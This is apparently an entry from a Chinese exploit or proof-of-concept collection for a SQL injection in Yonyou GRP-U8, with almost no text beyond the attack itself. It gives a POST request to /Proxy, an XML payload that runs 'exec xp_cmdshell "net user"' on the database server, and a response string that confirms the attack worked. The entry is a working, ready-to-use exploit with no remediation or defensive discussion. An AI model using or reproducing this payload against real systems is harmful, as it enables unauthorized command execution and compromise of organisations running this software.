# 用友OAncGRP-u8sql注入

用友 ｜ SQL注入 ｜ —
- **请求**：`POST /Proxy HTTP/1.1`

**Payload**
```
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "net user"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```
- **响应特征**：-1 Guest